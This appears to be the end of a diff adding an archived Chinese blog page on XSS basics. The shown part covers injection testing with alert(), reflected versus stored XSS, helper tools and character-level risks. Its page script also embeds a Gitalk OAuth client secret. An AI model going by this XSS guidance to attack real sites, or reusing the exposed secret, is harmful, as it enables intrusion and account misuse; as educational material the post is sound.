+<li>阻断</li>
+<li>利用特性</li>
+</ul>
+<p><strong>3. 修补注入错误</strong></p>
+<p>注入后保证没有语法错误，否则代码不会执行，注入了也没用。这里的意思是，你注入的一个参数可能在脚本多处出现，你可以保证一处没语法错误，但是不能保证处处都正确</p>
+<p><strong>4. 开搞</strong></p>
+<p>测试的时候alert("Barret李靖"),弹出成功再继续其他更邪恶的注入方式。</p>
+<h3>六、XSS分类</h3>
+<p>为什么留到后面说。XSS也了解了很多次了，每次都是先从概念触发，感觉没啥意思，什么反射性、DOM型、储存型等等，还不如先去实践下，凭着自己对XSS的理解，多看几个网站的源码，找找乐趣。</p>
+<p>存储型和反射型相比，只是多了输入存储、输出取出的过程。简单点说：</p>
+<p>反射型是：输入--输出；
+存储型是：输入--进入数据库*--取出数据库--输出。</p>
+<p>这样一来，大家应该注意到以下差别：</p>
+<p>反射型是：绝大部分情况下，输入在哪里，输出就在哪里。
+存储型是：输入在A处进入数据库， 而输出则可能出现在其它任何用到数据的地方。</p>
+<p>反射型是：输入大部分位于地址栏或来自DOM的某些属性，也会偶尔有数据在请求中（POST类型）
+存储型是：输入大部分来自POST/GET请求，常见于一些保存操作中。</p>
+<p>因而我们找存储型的时候，从一个地方输入数据，需要检测很多输出的点，从而可能会在很多点发现存储型XSS。</p>
+<h3>七、辅助工具</h3>
+<ol>
+<li>http://ha.ckers.org/xsscalc.html</li>
+<li>chrome插件 （xss Encode，百度之）</li>
+<li>抓包工具，<a  target="_blank" href="http://www.telerik.com/download/fiddler" target="_blank">fiddler4</a>  <a  target="_blank" href="http://www.charlesproxy.com/latest-release/download.do" target="_blank">chales</a></li>
+<li>白名单过滤工具<a href="//github.com/leizongmin/js-xss" target="_blank">github/js-xss</a></li>
+
+</ol>
+<h3>八、小结</h3>
+<p>简单小结：</p>
+<ul>
+<li>< 号不应该出现在HTML的大部分节点中。</li>
+<li>括号&lt;&gt;是不应该出现在标签内的，除非为引号引用。</li>
+<li>在ext节点里面，&lt;左尖括号有很大的危害。</li>
+<li>引号在标签内可能有危害，具体危害取决于存在的位置，但是在text节点是没有危害的。</li>
+<li>。。。</li>
+
+</ul>
+<p>关注漏洞报告平台 Wooyun，多动脑筋，手动 hack。最重要的还是先黑客再红客。</p>
+<h3>九、参考资料</h3>
+<ul>
+<li><a  target="_blank" href="http://drops.wooyun.org/tips/689" target="_blank">http://drops.wooyun.org/tips/689</a></li>
+<li><a  target="_blank" href="http://drops.wooyun.org/tips/147" target="_blank">http://drops.wooyun.org/tips/147</a></li>
+<li><a  target="_blank" href="http://www.web-tinker.com/article/20468.html" target="_blank">http://www.web-tinker.com/article/20468.html</a></li>
+<li><a  target="_blank" href="http://www.wooyun.org/whitehats/%E5%BF%83%E4%BC%A4%E7%9A%84%E7%98%A6%E5%AD%90" target="_blank">http://www.wooyun.org/whitehats/%E5%BF%83%E4%BC%A4%E7%9A%84%E7%98%A6%E5%AD%90</a></li>
+<li><a href="//www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" target="_blank">//www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</a></li>
+
+</ul>
+      </div>
+    </div>
+    
+    <!-- <div class="follow-wechat"><img src="/blogimgs/follow.jpg"></div> -->
+
+<div class="copyright" itemscope itemtype="http://schema.org/ProfilePage" tabindex="0" aria-hidden="true">
+	<!-- <a href="/about/#support" class="supportme">赏</a> -->
+	<ul>
+		<li>作者: <a href="/about/" itemprop="name">Barret李靖</a></li>
+		
+		<li>文章分类: 
+	<a class="category-link" href="/blog/categories/JavaScript/">JavaScript</a>,<a class="category-link" href="/blog/categories/JavaScript/%E5%89%8D%E7%AB%AF%E6%9D%82%E7%83%A9/">前端杂烩</a>
+
+</li>
+		
+		
+		<li>文章标签: 
+<a class="article-tag-none-link" href="/blog/tags/XSS/" rel="tag">XSS</a>, <a class="article-tag-none-link" href="/blog/tags/cnblogs/" rel="tag">cnblogs</a>
+</li>
+		
+		<li>发表日期: 2014-05-01 12:59:00</li>
+		<li>最后编辑时间: 2025-07-19 11:01:03</li>
+		<li>本文 Markdown 地址: <a target="_
+			" href="https://github.com/barretlee/blog/tree/master/blog/src/_posts/2014-05-01-cb-xss-snippets.md">XSS零碎指南</a></li>
+		<li>版权声明：<a  target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh" target="_blank">CC BY-NC-ND 3.0</a></li>
+		<li>
+			Feed 订阅: <a href="/rss2.xml"><i class="icon">&#x25c8;</i></a>
+			<div style="opacity:.3;text-align:right;margin:5px -5px -10px 0;float:right;font-size: 12px;">
+				编辑本文：<a  target="_blank" href="https://github.com/barretlee/blog/edit/master/blog/src/_posts/2014-05-01-cb-xss-snippets.md" target="_blank" aria-hidden="true"><i class="icon">&#xe622;</i></a>；
+				新建文章：<a  target="_blank" href="https://github.com/barretlee/blog/new/master/blog/src/_posts" target="_blank" aria-hidden="true"><i class="icon">&#xe616;</i></a>
+			</div>
+		</li>
+		
+	</ul>
+	<a href="/about/"><img style="max-width:120px" src="https://img.alicdn.com/imgextra/i3/O1CN01tDYnfz23AWT1ag79p_!!6000000007215-2-tps-1200-1200.png" /></a>
+</div>
+
+    <em  class="arrow-expend" tabindex="0" aria-hidden="0" aria-label="点击展开网页导航" aria-selected="true" aria-lable="网页导航" aria-expanded="false" id="i1">▾
+<ul role="group" aria-labelledby="i1" aria-expanded="false">
+  <li><a href="/entry/">博客</a></li>
+  <!-- <li><a href="/translation/">翻译</a></li> -->
+  <li><a href="/message/">留言</a></li>
+  <li><a href="/demo/">实验室</a></li>
+  <!-- <a><a href="/comments/">最近评论</a></li> -->
+  <li><a href="/friends/">友情链接</a></li>
+</ul>
+</em>
+  </div>
+  <div class="post-relative">
+<div class="page-relative">
+  
+    <a href="/blog/2014/05/02/cb-ecmascript6-overview/" class="post-prev">
+      <i class="icon" tabindex="0" aria-hidden="true">&#x261c;</i>
+      <span class="aria-readonly">上一篇文章</span>
+      
+        <b>ECMAScript 6入门</b>
+      
+    </a>
+  
+  
+    <a href="/blog/2014/04/30/previous-element-with-css/" class="post-next">
+      <span class="aria-readonly">下一篇文章</span>
+      <b>css选中前一个元素</b>
+      <i class="icon" tabindex="0" aria-hidden="true">&#xe602;</i>
+    </a>
+  
+</div>
+
+
+<div class="page-relative-fixed" tabindex="0" aria-hidden="true">
+  
+  <a href="/blog/2014/05/02/cb-ecmascript6-overview/" class="prev" title="ECMAScript 6入门">
+    <i class="icon">&#xe600;</i>
+    
+    <b>ECMAScript 6入门</b>
+    
+  </a>
+  
+  
+  <a href="/blog/2014/04/30/previous-element-with-css/" class="next" title="css选中前一个元素">
+    <i class="icon">&#x261e;</i>
+    <b>css选中前一个元素</b>
+  </a>
+  
+</div>
+</div>
+</div>
+<div class="sidebar" tabindex="0" aria-hidden="true">
+	<div class="func-btns func-btns-up">
+    <span class="func-item">
+        <i class="func-nav icon">&#xe618;<span>目录</span></i>
+        <div>
+          <i class="left-arrow"></i><i class="left-arrow-clone"></i>
+          <a href="javascript:void(0);" onclick="return false;">显示目录</a>
+        </div>
+    </span>
+    <span class="func-item">
+        <i class="func-font icon">&#xe604;<span>夜间</span></i>
+        <div class="font-choose-box">
+          <i class="left-arrow"></i><i class="left-arrow-clone"></i>
+          <div class="font-choose bg-choose">
+            <a href="javascript:void(0)" onclick="return false;" class="bg-type bg-type-sun font-type-song"><i class="icon">&#xe61a;</i></a>
+            <a href="javascript:void(0)" onclick="return false;" class="bg-type bg-type-moon font-type-hei"><i class="icon">&#xe619;</i></a>
+          </div>
+          <!-- <div class="font-choose">
+            <a href="javascript:void(0)" onclick="return false;" class="font-type font-type-song">黑体</a>
+            <a href="javascript:void(0)" onclick="return false;" class="font-type font-type-hei">宋体</a>
+          </div> -->
+        </div>
+    </span>
+    <span class="func-item">
+        <i class="func-about icon">&#x263b;<span>关于</span></i>
+        <div>
+          <i class="left-arrow"></i><i class="left-arrow-clone"></i>
+          <p><a href="/about/" class="func-about-link" target="_blank">关于作者</a></p>
+          <div id="followMeOnWeibo"></div>
+        </div>
+    </span>
+	</div>
+	<div class="func-btns">
+    <!-- <span class="func-item">
+        <a  target="_blank" href="http://demo.barretlee.com" target="_blank"><i class="func-rss icon">&#xe603;<span>实验</span></i></a>
+        <div><i class="left-arrow"></i><i class="left-arrow-clone"></i>
+          <p class="seperator"><a  target="_blank" href="http://demo.barretlee.com" target="_blank">Demo平台</a></p>
+          <p class="seperator"><a  target="_blank" href="http://md.barretlee.com" target="_blank">WX格式</a></p>
+          <p><a  target="_blank" href="http://snippets.barretlee.com" target="_blank">Snippet应用</a></p>
+        </div>
+    </span> -->
+    <!-- <span class="func-item">
+        <i class="func-fb icon">&#x2121;<span>留言</span></i>
+        <div><i class="left-arrow"></i><i class="left-arrow-clone"></i>
+          <p class="seperator"><a href="/message/" target="_blank">给我留言</a></p>
+          <p><a href="/comments/" target="_blank">近期留言</a></p>
+        </div>
+    </span> -->
+    <span class="func-item">
+        <a href="/friends/" target="_blank"><i class="func-rss icon">&#xe601;<span>链接</span></i></a>
+        <div><i class="left-arrow"></i><i class="left-arrow-clone"></i>
+          <a href="/friends/" target="_blank">友情链接</a>
+        </div>
+    </span>
+    <span class="func-item">
+        <a href="/rss2.xml" target="_blank"><i class="func-rss icon">&#x25c8;<span>订阅</span></i></a>
+        <div><i class="left-arrow"></i><i class="left-arrow-clone"></i><a href="/rss2.xml" target="_blank">订阅我吧！</a></div>
+    </span>
+	</div>
+</div>
+
+<div class="single-page-footer">
+<div class="footer">
+	<div class="footer-wraper">
+		<div class="footer-content">
+			<div class="footer-nav">
+	<a href="javascript: void(0);" class="ds-thread-count disqus-comment-count"
+	   data-thread-key="cb-xss-snippets"
+	   data-disqus-identifier="cb-xss-snippets" 
+		 tabindex="0" aria-hidden="true">评论内容</a>
+	<a href="javascript: void(0);" id="comments">相关文章</a>
+	<a href="/friends/" tabindex="0" aria-hidden="true" style="display: none;">友情链接</a>
+</div>
+<div class="nav-detail">
+	<div tabindex="0">
+		
+  <div id="gitalk" sid="cb-xss-snippets"></div>
+  <script charset="utf-8" type="text/javascript" src="https://fastly.jsdelivr.net/gh/barretlee/blog@gh-pages/public/js/gitalk.js"></script>
+  <script type="text/javascript">
+  var postContent = document.querySelectorAll('.post-content>p');
+  if (postContent && postContent.length) {
+    postContent = postContent.item(0).textContent + (postContent.item(1) && postContent.item(1).textContent || '');
+    postContent = postContent.length > 140 ? postContent.slice(0, 140) + '...' : postContent;
+  }
+
+  var gitalk = new Gitalk({
+    clientID: '50a1b3aa7854b01a1c85',
+    clientSecret: '226ac154f80a6aea0985da874126b35795f22eed',
+    language: "zh-CN",
+    perPage: 100,
+    createIssueManually: false,
+    repo: 'blog',
+    owner: 'barretlee',
+    admin: ['barretlee'],
+    id: "cb-xss-snippets",
+    body: '原文地址：' + location.href + '\n\n文摘：' + postContent,
+    distractionFreeMode: false
+  });
+
+  window.addEventListener('load', function () {
+    gitalk.render('gitalk');
+  });
+
+  // show count
+  var commentTimer = setInterval(() => {
+    var count = document.querySelector('.gt-link-counts');
+    var showCount = document.querySelector('.hash-to-comments');
+    if (count && showCount) {
+      showCount.textContent = count.textContent;
+      clearInterval(commentTimer);
+    }
+  }, 500);
+  setTimeout(() => {
+    clearInterval(commentTimer);
+  }, 60 * 1E3);
+  </script>
+  
+	</div>
+	<div style="display:block;">
+		<div class="relative-wrapper">
+	<div class="relative-article">
+		
+		<ul>
+			<li>
+				<span><font aria-hidden="true">2019-03-13 »</font> </span>
+				<a href="/blog/2019/03/13/first-buildin-module-kv-storage/">KV Storage，Web 上第一个内置模块</a>
+				<span class="aria-readonly">发表时间为2019年03月13日</span>
+				<div class="relative-box">
+          <a href="/blog/2019/03/13/first-buildin-module-kv-storage/" class="relative-img-wrapper"><img src="https://raw.githubusercontent.com/barretlee/blog/gh-pages/blogimgs/2019/03/13/kv-storage-build-in-module.png" style="width:100%" loading="lazy" data-original="/../blogimgs/2019/03/13/kv-storage-build-in-module.png"/></a>
+          <span class="aria-readonly">文章概要 </span>原文地址：KV Storage, the Web’s First Built-in Module原文时间：2019年3月翻译计划：https://github.com/barretlee/translation-plan翻译人员：小胡子哥在...
+        </div>
+			</li>
+			
+			<li>
+				<span><font aria-hidden="true">2017-06-06 »</font> </span>
+				<a href="/blog/2017/06/06/dive-to-nodejs-at-stream-module/">深入理解 Node Stream 内部机制</a>
+				<span class="aria-readonly">发表时间为2017年06月06日</span>
+				<div class="relative-box">
+          <a href="/blog/2017/06/06/dive-to-nodejs-at-stream-module/" class="relative-img-wrapper"><img src="https://raw.githubusercontent.com/barretlee/blog/gh-pages/blogimgs/2017/06/06/node-stream-readable-flowing.png" style="width:100%" loading="lazy" data-original="/../blogimgs/2017/06/06/node-stream-readable-flowing.png"/></a>
+          <span class="aria-readonly">文章概要 </span>相信很多人对 Node 的 Stream 已经不陌生了，不论是请求流、响应流、文件流还是 socket 流，这些流的底层都是使用 stream 模块封装的，甚至我们平时用的最多的 console.log 打印日志也使用了它，不信你打开 No...
+        </div>
+			</li>
+			
+			<li>
+				<span><font aria-hidden="true">2016-09-28 »</font> </span>
+				<a href="/blog/2016/09/28/ieee754-operation-in-js/">揭秘 0.1 + 0.2 != 0.3</a>
+				<span class="aria-readonly">发表时间为2016年09月28日</span>
+				<div class="relative-box">
+          <a href="/blog/2016/09/28/ieee754-operation-in-js/" class="relative-img-wrapper"><img src="https://raw.githubusercontent.com/barretlee/blog/gh-pages/blogimgs/2016/09/28/6c0378f8gw1f89pd8hm96j20p00dwacm.jpg" style="width:100%" loading="lazy" data-original="/../blogimgs/2016/09/28/6c0378f8gw1f89pd8hm96j20p00dwacm.jpg"/></a>
+          <span class="aria-readonly">文章概要 </span>“0.1 + 0.2 &#x3D; ?”，这道题如果给小学生，他会立马告诉你答案是 0.3，但是交给一些程序去计算，结果就不是那么简单了。-->
+        </div>
+			</li>
+			
+			<li>
+				<span><font aria-hidden="true">2016-08-23 »</font> </span>
+				<a href="/blog/2016/08/23/javascript-sandbox/">构建一个安全的 JavaScript 沙箱</a>
+				<span class="aria-readonly">发表时间为2016年08月23日</span>
+				<div class="relative-box">
+          <a href="/blog/2016/08/23/javascript-sandbox/" class="relative-img-wrapper"><img src="https://raw.githubusercontent.com/barretlee/blog/gh-pages/blogimgs/2016/08/23/6c0378f8gw1f730uldkfrj20p00dwaf1.jpg" style="width:100%" loading="lazy" data-original="/../blogimgs/2016/08/23/6c0378f8gw1f730uldkfrj20p00dwaf1.jpg"/></a>
+          <span class="aria-readonly">文章概要 </span>-->在 Node.js 中有一个模块叫做 VM，它提供了几个 API，允许代码在 V8 虚拟机上下文中运行，如：const vm = require(&#x27;vm&#x27;);const sandbox = &#123; a: 1, b: 2 &#125;;const script = new vm.Script(&#x27;a + b&#x27;);const context = new vm.createContext(sandbox);script.runInContext(context);vm.Script 中的代码是预编译好的，通过 vm.createContext 将代码加载到一个上下文环境中，置入沙箱（sandbox），然后通过 script.runInContext 执行代码，整个操作都在封闭的 VM 中进行。这是 Node.js 提供给我们的便捷功能，那么，在浏览器环境中呢？是否也能做到将代码运行在沙箱中？本文带着大家来探索一番。
+        </div>
+			</li>
+			
+		</ul>
+	</div>
+</div>
+
+		<div class="relative-to-comment" tabindex="0" aria-hidden="true"><span>留下评论</span></div>
+		<!-- <a href="/entry/" class="relative-to-comment-wrapper" tabindex="0" aria-hidden="true"><div class="relative-to-comment">回到首页</div></a> -->
+	</div>
+	<div class="friends-box">
+		<ul>
+			
+			<li><a  target="_blank" href="http://hustskyking.cnblogs.com" target="_blank">旧博客</a> <font aria-hidden="true">»</font> <span>我的旧博客（博客园荣誉博客）</span></li>
+			
+			<li><a  target="_blank" href="http://www.zhangmengxue.com" target="_blank">大额</a> <font aria-hidden="true">»</font> <span>大额大额哼歌等日落</span></li>
+			
+			<li><a  target="_blank" href="http://www.zhangxinxu.com" target="_blank">张鑫旭</a> <font aria-hidden="true">»</font> <span>原来大学我俩一个团队的~</span></li>
+			
+			<li><a  target="_blank" href="http://web-tinker.com" target="_blank">次碳酸钴</a> <font aria-hidden="true">»</font> <span>深度交流的一个好朋友</span></li>
+			
+			<li><a  target="_blank" href="http://imququ.com" target="_blank">屈屈</a> <font aria-hidden="true">»</font> <span>蛐蛐同学</span></li>
+			
+			<li><a  target="_blank" href="http://www.ruanyifeng.com" target="_blank">阮一峰</a> <font aria-hidden="true">»</font> <span>阮老师</span></li>
+			
+			<li><a href="/friends/">更多列表 <font aria-hidden="true">»</font></a></li>
+		</ul>
+	</div>
+</div>
+			
+<div class="website-info" aria-hidden="true">
+	<a class="page_editor" href="/admin/#/posts/cmd9nvpc300cmqk9bebge6ar3" target="_blank">🙈</a>
+	<span>&copy;2013-2025 <small><a  target="_blank" href="https://www.miit.gov.cn/" about="_blank">湘ICP备14007107号-1</a></small></span>
+	本站由 <a href="/">Barret李靖</a> 纯手工打造 | <a href="/about#contact">联系方式</a>
+	<a href='https://union.zhaodao.ai/#random' title="随机跳转到一个有意思的网站" target='_blank' class="zhidao_ai"><img src='https://img.alicdn.com/imgextra/i2/O1CN01VjiZUL1r0eXge4taM_!!6000000005569-55-tps-300-300.svg' width="20" height="20"></a>
+</div>
+
+		</div>
+	</div>
+</div>
+</div>
+<div class="tools-wrapper" tabindex="0" aria-hidden="true">
+	<a class="gotop icon" href="#" title="回到顶部">&#x2191;</a>
+	<!-- <a class="wechart icon">&#xe60d;<span><img src="/blogimgs/wechart.png" title="扫码添加小胡子哥微信"/> </span></a> -->
+	<a class="hash-to-comments icon" title="我要评论">&#x2121;</a>
+</div>
+<div class="fixerr" tabindex="0" aria-hidden="true">纠错模式</div>
+
+</body>
+<script src="https://fastly.jsdelivr.net/gh/barretlee/blog@gh-pages/public/js/jquery.js"></script>
+<script src="https://fastly.jsdelivr.net/gh/barretlee/blog@gh-pages/public/js/main.js"></script>
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-67248043-3"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'UA-67248043-3');
+</script>
+
+<!-- Baidu Analysis -->
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?3524fff9629f2c80f8ea5daa13e67003";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.async = true;
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+<script>
+  window.onerror = function(e) {
+    window.console && window.console.log && window.console.log(e);
+    try {
+      $('#loadLayer').remove();
+    } catch(e) {}
+    return true;
+  };
+</script>
+</html>
